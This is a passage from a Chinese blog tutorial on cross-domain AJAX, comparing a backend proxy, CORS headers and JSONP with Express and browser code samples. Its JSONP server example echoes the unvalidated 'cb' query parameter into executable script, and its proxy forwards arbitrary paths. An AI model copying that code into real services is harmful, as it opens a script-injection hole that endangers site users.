<li><strong>thirdparty</strong>，表示我们需要调用到的第三方（third-party）后端服务，myweb项目就是需要调用它的接口。</li>
</ul>
<p>为了简化不必要的代码编写过程，示例使用<code>express-generator</code>来快速生成myweb与thirdparty这两个应用，其中thirdparty我们只需要用到后端接口部分。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install express-generator -g</span><br><span class="line">express --view=pug myweb</span><br><span class="line">express --view=pug thirdparty</span><br></pre></td></tr></table></figure>

<p>在myweb中，index页面 <code>http://127.0.0.1:8085</code>需要跨域访问server中的<code>http://127.0.0.1:3000/info/normal</code>这个接口的信息。前端操作是：当点击<code>button</code>时就会去获取info，并alert出来。<br> 跨域访问的接口<code>http://127.0.0.1:3000/info/normal</code>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&apos;express&apos;);</span><br><span class="line">const router = express.Router();</span><br><span class="line"></span><br><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;alienzhou&apos;,</span><br><span class="line">    desc: &apos;a developer&apos;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">router.get(&apos;/normal&apos;, (req, res, next) =&gt; &#123;</span><br><span class="line">    res.json(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>然后是<code>http://127.0.0.1:8085</code>index页面的部分的javascript</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://127.0.0.1:8085  -- index.js</span><br><span class="line">document.getElementById(&apos;btn-1&apos;).addEventListener(&apos;click&apos;, function() &#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = function() &#123;</span><br><span class="line">        if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.open(&apos;get&apos;, &apos;http://127.0.0.1:3000/info/normal&apos;);</span><br><span class="line">    xhr.send(null);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>点击<code>btn-1</code>，在控制台中就会出现如下错误，这个跨域ajax请求受到了同源策略的限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Error] Origin http://127.0.0.1:8085 is not allowed by Access-Control-Allow-Origin.</span><br><span class="line">[Error] Failed to load resource: Origin http://127.0.0.1:8085 is not allowed by Access-Control-Allow-Origin. (normal, line 0)</span><br><span class="line">[Error] XMLHttpRequest cannot load http://127.0.0.1:3000/info/normal due to access control checks.</span><br></pre></td></tr></table></figure>

<p>下面来讲具体的三种解决方案：</p>
<h3 id="使用代理（proxy）"><a href="#使用代理（proxy）" class="headerlink" title="使用代理（proxy）"></a>使用代理（proxy）</h3><p>这种方法本质上仍然遵循了同源政策，只是换了一个请求的思路，将请求移至了后端。</p>
<p>我们知道，同源政策是浏览器层面的限制。那么，如果我们不在前端跨域，而将“跨域”的任务交给后端服务，是否就规避了同源政策呢？是的。</p>
<p>这就是“代理”。这个代理可以将我们的请求转发，而后端并不会有所谓的同源政策限制。这个“代理”也可以理解为一个同域的后端服务。</p>
<p>由于我们的myweb是一个完整的web项目（包括前端部分和后端服务部分），因此，我们可以在myweb项目的后端添加一个<code>proxy</code>接口，专门处理跨域ajax请求的转发。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&apos;express&apos;);</span><br><span class="line">const router = express.Router();</span><br><span class="line">const request = require(&apos;request&apos;);</span><br><span class="line"></span><br><span class="line">router.get(&apos;*&apos;, (req, res, next) =&gt; &#123;</span><br><span class="line">    let path = req.path.replace(/^\/proxy/, &apos;&apos;);</span><br><span class="line">    request.get(`http://127.0.0.1:3000$&#123;path&#125;`, (err, response) =&gt; &#123;</span><br><span class="line">        res.json(JSON.parse(response.body));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>

<p>这样，我们在前端访问<code>/proxy/info/normal</code>后，就会自动转发到<code>http://127.0.0.1:3000/proxy/info/normal</code>。</p>
<p>前端ajax部分如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&apos;btn-1&apos;).addEventListener(&apos;click&apos;, function() &#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = function() &#123;</span><br><span class="line">        if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.open(&apos;get&apos;, &apos;/proxy/info/normal&apos;);</span><br><span class="line">    xhr.send(null);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>该方法的优点很明显：不需要第三方服务<code>http://127.0.0.1:3000/info/normal</code>进行任何改造。</p>
<p>当然，该方法也有一些缺点：</p>
<ul>
<li>首先，需要你有一个自己的后端服务能够接收并转发请求。如果你进行本地的纯静态页面开发，则需要一些浏览器插件或自动化工具中集成的本地服务器来实现。</li>
<li>此外，如果请求包含一些特殊的请求头（例如cookie等等），需要在转发时特殊处理。</li>
</ul>
<p>下面两种方法则需要第三方服务端或多或少进行配合改造。</p>
<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>同源策略往往过于严格了，为了解决浏览器的这个问题，w3c提出了CORS（Cross-Origin Resource Sharing）标准。CORS通过相应的请求头与响应头来实现跨域资源访问。</p>
<p>如果我们打开控制台，可以在请求头中发现一个叫<code>origin</code>的头信息，它表明了请求的来源。这是浏览器自动添加的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://127.0.0.1:8085/</span><br><span class="line">Origin: http://127.0.0.1:8085   &lt;============   origin</span><br><span class="line">Accept: */*</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8</span><br><span class="line">Pragma: no-cache</span><br></pre></td></tr></table></figure>

<p>与之对应的，服务器端的响应头中一个头信息为<code>Access-Control-Allow-Origin</code>，表明接受的跨域请求来源。显而易见，这两个信息如果一致，则这个请求就会被接受。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.get(&apos;/cors&apos;, (req, res, next) =&gt; &#123;</span><br><span class="line">    res.setHeader(&apos;Access-Control-Allow-Origin&apos;, &apos;http://127.0.0.1:8085&apos;);</span><br><span class="line">    res.json(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>如果将<code>Access-Control-Allow-Origin</code>的值设置为<code>*</code>，则会接受所有域的请求。这时的客户端不需要任何配置即可进行跨域访问。</p>
<p>然而，还有一个问题，CORS默认是不会发送cookie，但是如果我希望这次的请求也能够带上对方服务所需的cookie怎么办？那就需要再进行一定的改造。</p>
<p>与<code>Access-Control-Allow-Origin</code>相配套的，还有一个叫<code>Access-Control-Allow-Credentials</code>的响应头，如果设置为<code>true</code>则表明服务器允许该请求内包含cookie信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.get(&apos;/cors&apos;, (req, res, next) =&gt; &#123;</span><br><span class="line">    res.setHeader(&apos;Access-Control-Allow-Origin&apos;, &apos;http://127.0.0.1:8085&apos;);</span><br><span class="line">    res.setHeader(&apos;Access-Control-Allow-Credentials&apos;, true);</span><br><span class="line">    res.json(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>同时，在客户端，还需要在ajax请求中设置<code>withCredentials</code>属性为<code>true</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&apos;btn-1&apos;).addEventListener(&apos;click&apos;, function() &#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    xhr.withCredentials = true;  // 设置withCredentials以便发送cookie</span><br><span class="line">    xhr.onreadystatechange = function() &#123;</span><br><span class="line">        if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.open(&apos;get&apos;, &apos;http://127.0.0.1:3000/info/cors&apos;);  // 跨域请求</span><br><span class="line">    xhr.send(null);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到，CORS方法有如下优点：</p>
<ul>
<li>简单，几乎不需要什么开发量，只需要简单配置相应的请求与响应头信息即可。</li>
<li>支持各种类型的请求（<code>get</code>, <code>post</code>, <code>put</code>等等）。</li>
</ul>
<p>但缺点是：</p>
<ul>
<li>需要对跨域的服务接口进行一定的改造。如果该服务因为某些原因无法改造，则无法实现。但这种改造还是相对较小的。</li>
<li>不兼容一些“古董”浏览器。</li>
</ul>
<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>jsonp是跨域领域中历史非常传统的一种方法。如果你还记得第一部分中我们提到过的内容，一些跨域请求是不会受到同源政策的限制的。其中，<code>script</code>标签就是一个。</p>
<p>在<code>script</code>标签中我们可以引用其他服务上的脚本，最常见的场景就是CDN。因此，有人想到，当有跨域请求到来时，如果我们可以把客户端需要的数据写到javascript脚本文件中并返回给客户端，那么客户端就可以拿到这些数据并使用了。具体是怎样一个流程呢？</p>
<ol>
<li>首先，在myweb端，我们可以预先定义一个处理函数，叫它<code>callback</code>；</li>
<li>然后，在myweb端，我们动态创建一个script标签，并将该标签的<code>src</code>属性指向跨域的接口，并将<code>callback</code>函数名作为请求的参数；</li>
<li>跨域的thirdparty端接受到该请求后，返回一个javascript脚本文件，用<code>callback</code>函数包裹住数据；</li>
<li>这时候，前端收到响应数据会自动执行该脚本，这样便会自动执行预先定义的<code>callback</code>函数。</li>
</ol>
<p>将上面这个方法具体成下面的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// myweb 部分</span><br><span class="line">// 1. 创建回调函数callback</span><br><span class="line">function myCallback(res) &#123;</span><br><span class="line">    alert(JSON.stringify(res, null , 2));</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&apos;btn-4&apos;).addEventListener(&apos;click&apos;, function() &#123;</span><br><span class="line">    // 2. 动态创建script标签，并设置src属性，注意参数cb=myCallback</span><br><span class="line">    var script = document.createElement(&apos;script&apos;);</span><br><span class="line">    script.src = &apos;http://127.0.0.1:3000/info/jsonp?cb=myCallback&apos;;</span><br><span class="line">    document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script);</span><br><span class="line">&#125;);</span><br><span class="line">// thirdparty</span><br><span class="line">router.get(&apos;/jsonp&apos;, (req, res, next) =&gt; &#123;</span><br><span class="line">    var str = JSON.stringify(data);</span><br><span class="line">    // 3. 创建script脚本内容，用`callback`函数包裹住数据</span><br><span class="line">    // 形式：callback(data)</span><br><span class="line">    var script = `$&#123;req.query.cb&#125;($&#123;str&#125;)`;</span><br><span class="line">    res.send(script);</span><br><span class="line">&#125;);</span><br><span class="line">// 4. 前端收到响应数据会自动执行该脚本</span><br></pre></td></tr></table></figure>

<p>当然，如果你是用类似jquery这样的库，其中的<code>$.ajax</code>本身是封装了JSONP方式的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &apos;http://127.0.0.1:3000/info/jsonp?cb=myCallback&apos;,</span><br><span class="line">    dataType: &apos;jsonp&apos;, // 注意，此处dataType的值表示请求使用JSONP</span><br><span class="line">    jsonp: &apos;cb&apos;, // 请求query中callback函数的键名</span><br><span class="line">&#125;).done(function (res) &#123;</span><br><span class="line">    alert(JSON.stringify(res, null , 2));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>JSONP作为一个久远的方法，其最大的优点就是兼容性非常好。</p>
<p>但是其缺点也很明显，由于是通过<code>script</code>标签发起的请求，因此只支持<code>get</code>请求。同时可以看到，较之CORS，其前后端改造开发量要稍高一些。如果跨域服务端不支持改造，那么也无法使用该方法。</p>
<hr>
<p>上面三个方案的实例代码可以在这里（<a href="https://link.jianshu.com?t=https://github.com/alienzhou/cross-domain-demo" target="_blank" rel="noopener">cross-domain-demo</a>）clone到本地并运行。<code>git clone git@github.com:alienzhou/cross-domain-demo.git</code></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>同源策略作为浏览器的安全策略之一，在保证请求的安全性之外，也对我们的一些合理与期望的请求进行了控制。幸好，在面对跨域ajax请求时，我们还有一些方法可以应对它，包括使用代理、CORS和JSONP。在不同场景下合理运用各种方法，可以帮助我们有效解决ajax跨域问题。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.cnblogs.com/2050/p/3191744.html" target="_blank" rel="noopener">js中几种实用的跨域方法原理详解</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28562290" target="_blank" rel="noopener">跨域的那些事儿</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a></li>
</ul>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="Darren-zl">
            
              <p class="site-author-name" itemprop="name">Darren-zl</p>
              <p class="site-description motion-element" itemprop="description">一天一小步，随着时间的积累，你将会发现你其实已经走了很远。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Darren-zl" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://weibo.com/p/1005052390784733/home?from=page_100505&mod=TAB&pids=plc_main" target="_blank" title="Weibo">
                      
                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Darren-zl</span>

  
</div>


  <!--<div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>-->



 <!-- <span class="post-meta-divider">|</span>-->



  <!--<div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>-->




        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i> 访问人数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i> 总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  <div class="bg_content">
    <canvas id="canvas"></canvas>
</div>



  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  




  
    <script id="cy_cmt_num" src="https://changyan.sohu.com/upload/plugins/plugins.list.count.js?clientId=cytxCyGhU"></script>
  









  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("29xnQ1C2kcwORHYYn7xsWTnS-gzGzoHsz", "Rq1Gk75oRwH78BryWUL4oYzj");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  



</body>
</html>
